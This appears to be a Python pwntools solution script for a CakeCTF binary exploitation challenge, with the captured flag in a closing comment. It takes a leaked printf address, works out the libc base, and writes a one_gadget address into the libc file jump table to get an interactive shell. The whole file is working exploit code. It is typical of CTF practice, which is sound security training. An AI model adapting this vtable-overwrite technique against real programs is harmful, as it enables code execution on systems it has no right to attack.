from pwn import *
import sys

elf = ELF("./chall_patched")
libc = ELF("libc.so.6")
# p = remote("pwn.cakectf.com", 9003)
p = process("./chall_patched", env={"LD_PRELOAD":"libc-2.31.so"})

def solve():
    one_gadgets = [0xe6c7e, 0xe6c81, 0xe6c84]
    p.recvuntil("<printf> = ")
    printf_addr = int(p.recv(14), 16)
    libc.address = printf_addr - libc.symbols["printf"]
    p.sendlineafter("address: ", hex(libc.symbols["_IO_file_jumps"] + 0x38))
    p.sendlineafter("value: ", hex(libc.address + one_gadgets[0]))
    p.sendlineafter("data: ", "\x00")

    p.interactive()
if __name__ == "__main__":
    solve()

# CakeCTF{*ABS*+0x190717@IGOTIT}